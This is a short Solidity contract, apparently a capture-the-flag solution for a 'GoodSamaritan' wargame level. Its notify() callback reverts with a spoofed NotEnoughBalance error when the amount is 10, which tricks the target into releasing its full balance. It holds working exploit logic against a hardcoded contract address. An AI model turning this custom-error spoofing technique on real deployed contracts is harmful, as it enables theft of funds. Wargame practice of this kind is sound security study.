pragma solidity >=0.8.0 <0.9.0;

import "hardhat/console.sol";
import "./GoodSamaritan.sol";


contract GoodSamaritanAttacker is INotifyable {
event Amount(uint256 amount);
    error NotEnoughBalance();
    address public target;

    function notify(uint256 amount) override external {
        emit  Amount(amount);
        if (amount == 10) {
            // revert("NotEnoughBalance()");
            revert NotEnoughBalance();
        }
        console.log(amount);
    }

    constructor(address _target)  {
        target = 0xd59Bb4F61a91A21a4C8f3F923C9179633638701A;
    }

    function attack() public {
        GoodSamaritan(target).requestDonation();
       
    }


}

